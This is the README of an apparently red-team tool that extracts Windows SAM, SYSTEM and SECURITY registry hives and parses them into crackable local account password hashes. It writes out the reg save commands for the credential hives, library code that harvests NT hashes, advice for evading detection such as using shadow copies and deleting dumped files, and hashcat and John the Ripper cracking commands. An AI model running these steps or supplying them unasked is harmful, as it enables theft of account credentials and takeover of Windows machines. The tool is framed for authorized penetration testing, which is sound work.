# SAM Extractor Framework

**SAM/SYSTEM Registry Extraction & Local Account Hash Harvesting**  
Part of the *30 Days of Red Team* Series

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for authorized penetration testing and security research. Unauthorized access to computer systems is illegal. Users are responsible for complying with applicable laws and obtaining proper authorization before use.

---

## 🎯 Overview

A professional-grade SAM/SYSTEM registry extraction framework supporting multiple techniques with varying OPSEC profiles. Automates local account password hash harvesting from Windows systems with intelligent method selection and automatic parsing.

### Key Features

- **2 Extraction Methods**: From standard (reg save) to stealthy (VSS)
- **Auto Method Selection**: Intelligent fallback based on OPSEC ratings
- **Hash Extraction**: Automatic parsing with Impacket secretsdump
- **Professional Architecture**: Modular, extensible, production-ready
- **CLI & Library**: Use as command-line tool or Python library
- **Multiple Output Formats**: Text, Hashcat, John the Ripper

---

## 📋 Requirements

- **OS**: Windows 10/11, Windows Server 2016+
- **Privileges**: Administrator or SYSTEM
- **Python**: 3.8+
- **Dependencies**: Impacket (for secretsdump)

---

## 🚀 Installation

### Quick Install

```bash
# Clone repository
git clone https://github.com/yourusername/sam_extractor_framework.git
cd sam_extractor_framework

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x sam_extract.py
```

### Package Install

```bash
# Install as package
pip install -e .

# Verify installation
python -c "import rt_sam_extractor; print(sam_extractor.__version__)"
```

---

## 💻 Usage

### Command-Line Interface

#### Basic Usage

```bash
# Check privileges and availability
python sam_extract.py check

# Auto extract with best method
python sam_extract.py extract --auto

# Extract with specific method
python sam_extract.py extract --method reg_save

# Extract and parse automatically
python sam_extract.py extract --auto --parse
```

#### Parse Existing Hives

```bash
# Parse SAM/SYSTEM files
python sam_extract.py parse --sam sam.save --system system.save

# Include SECURITY hive
python sam_extract.py parse --sam sam.save --system system.save --security security.save

# Parse without saving hashes
python sam_extract.py parse --sam sam.save --system system.save --no-save
```

#### Method Information

```bash
# List all methods
python sam_extract.py list

# Show only available methods
python sam_extract.py list --available

# Get detailed method info
python sam_extract.py info --method vss
```

### Python Library Usage

#### Basic Extraction

```python
from rt_sam_extractor import SAMExtractor

# Initialize framework
extractor = SAMExtractor(output_dir="dumps")

# Check privileges
if not extractor.check_privileges():
    print("Requires administrator privileges")
    exit(1)

# Execute extraction
result = extractor.extract(method='reg_save')

if result:
    print(f"SAM: {result['sam']}")
    print(f"SYSTEM: {result['system']}")
```

#### Auto Extract with Parsing

```python
from rt_sam_extractor import SAMExtractor

extractor = SAMExtractor()

# Auto extract and parse
result = extractor.extract_and_parse(method='auto', auto_parse=True)

if result:
    print(f"Extracted {result['credential_count']} account hashes")
    
    # Access credentials
    for cred in result['credentials']:
        username = cred['username']
        nt_hash = cred['nt_hash']
        
        print(f"{username}: {nt_hash}")
```

#### Method-Specific Usage

```python
from rt_sam_extractor.methods import RegSaveExtractor, VSSExtractor
from pathlib import Path

# Use specific extractor
output_dir = Path("dumps")
extractor = RegSaveExtractor(output_dir)

# Check if available
if extractor.is_available():
    result = extractor.extract()
    
    if result:
        print(f"Success: {result['sam']}")
```

---

## 🎭 Extraction Methods

### 1. reg save (OPSEC: Medium)

**Standard Windows registry extraction**

- ✅ Built-in Windows command
- ✅ No external tools required
- ✅ Reliable and stable
- ⚠️ Creates files on disk
- ⚠️ May be logged

```bash
# CLI
python sam_extract.py extract --method reg_save

# Python
extractor.extract(method='reg_save')
```

**How it works:**
```cmd
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

### 2. Volume Shadow Copy (OPSEC: High)

**Extract from VSS to bypass locks**

- ✅ Bypasses file system locks
- ✅ Uses legitimate Windows VSS
- ✅ Automatic cleanup
- ✅ More stealthy
- ⚠️ VSS operations logged

```bash
# CLI
python sam_extract.py extract --method vss

# Python
extractor.extract(method='vss')
```

**How it works:**
1. Create shadow copy of C: drive
2. Copy registry hives from shadow
3. Automatically delete shadow copy

---

## 📊 Output Files

The framework generates several output files:

```
sam_dumps/
├── sam_20240115_120000.save           # SAM hive
├── system_20240115_120000.save        # SYSTEM hive
├── security_20240115_120000.save      # SECURITY hive
├── sam_hashes.txt                     # Text format
├── sam_hashes_hashcat.txt             # Hashcat format
└── sam_hashes_john.txt                # John the Ripper format
```

### Hash Formats

**Text Format**:
```
Username: Administrator
RID: 500
LM Hash: aad3b435b51404eeaad3b435b51404ee
NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
Full: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Hashcat Format** (-m 1000):
```
Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
```

**John Format**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

---

## 🔧 Advanced Usage

### Custom Output Directory

```python
extractor = SAMExtractor(output_dir="/tmp/custom_dumps")
```

### Parse Only (No Extraction)

```python
from rt_sam_extractor import SecretsdumpParser

parser = SecretsdumpParser()
credentials = parser.parse_hives("sam.save", "system.save")

# Display credentials
parser.display_credentials(credentials)

# Save in specific format
parser.save_credentials(credentials, "output.txt", format='hashcat')
```

### Validate Extracted Files

```python
from rt_sam_extractor.utils import validate_extracted_files

is_valid, msg = validate_extracted_files("sam.save", "system.save")

if is_valid:
    print("Files are valid")
else:
    print(f"Validation failed: {msg}")
```

---

## 🛡️ OPSEC Considerations

### Detection Vectors

1. **Registry Access**: Accessing SAM/SYSTEM triggers alerts
2. **File Creation**: Hive files created on disk
3. **VSS Operations**: Shadow copy creation logged
4. **Process Execution**: reg.exe and vssadmin.exe execution

### Evasion Techniques

- **Use VSS method**: More stealthy than direct registry access
- **Encrypt immediately**: Encrypt extracted hives on disk
- **Memory parsing**: Parse hives in memory when possible
- **Cleanup**: Delete hive files after parsing
- **Timing**: Extract during maintenance windows

### Recommended Approach

```python
# 1. Use high-OPSEC method
result = extractor.auto_extract(preferred_method='vss')

# 2. Parse immediately
credentials = extractor.parse_hives(
    result['sam'],
    result['system']
)

# 3. Clean up
import os
os.remove(result['sam'])
os.remove(result['system'])
```

---

## 🎓 Understanding SAM Hashes

### What is SAM?

The **Security Account Manager (SAM)** database stores local user account credentials as password hashes:

- **Location**: `C:\Windows\System32\config\SAM`
- **Protected**: Locked by Windows, cannot be copied while running
- **Encryption**: Encrypted with boot key from SYSTEM hive

### Hash Types

**LM Hash** (Legacy):
```
aad3b435b51404eeaad3b435b51404ee  (disabled/empty)
```

**NTLM Hash** (Modern):
```
31d6cfe0d16ae931b73c59d7e0c089c0  (empty password)
8846f7eaee8fb117ad06bdd830b7586c  (hashed password)
```

### Cracking Hashes

```bash
# Hashcat (NTLM)
hashcat -m 1000 hashes.txt wordlist.txt

# John the Ripper
john --format=NT hashes.txt --wordlist=wordlist.txt

# Rainbow tables (online)
# Search NTLM hash on sites like CrackStation
```

---

## 📚 Project Structure

```
rt_sam_extractor_framework/
├── rt_sam_extractor/
│   ├── __init__.py              # Package exports
│   ├── core.py                  # Main framework orchestrator
│   ├── cli.py                   # Command-line interface
│   ├── methods/                 # Extraction methods
│   │   ├── __init__.py
│   │   ├── reg_save.py          # reg save method
│   │   └── vss.py               # Volume Shadow Copy method
│   ├── parsers/                 # Hash extraction
│   │   ├── __init__.py
│   │   └── secretsdump_parser.py
│   └── utils/                   # Helper utilities
│       ├── __init__.py
│       ├── privileges.py        # Privilege checking
│       └── registry.py          # Registry utilities
├── examples/                    # Usage examples
│   ├── basic_extract.py
│   ├── auto_extract_and_parse.py
│   └── compare_methods.py
├── sam_extract.py              # Main CLI entry point
├── requirements.txt            # Python dependencies
├── setup.py                    # Package setup
└── README.md                   # This file
```

---

## 🤝 Contributing

This framework is part of the "30 Days of Red Team" series. Contributions welcome:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request

---

## 📖 References

- [SAM Database Structure](https://en.wikipedia.org/wiki/Security_Account_Manager)
- [Impacket secretsdump](https://github.com/SecureAuthCorp/impacket)
- [Volume Shadow Copy Service](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
- [NTLM Hash Cracking](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [30 Days of Red Team Series](https://medium.com/@maxwellcross)

---

## 📄 License

This project is for educational and authorized security testing purposes only.  
See LICENSE file for details.

---

**Happy Hunting! 🎯**  
*From the 30 Days of Red Team Series*
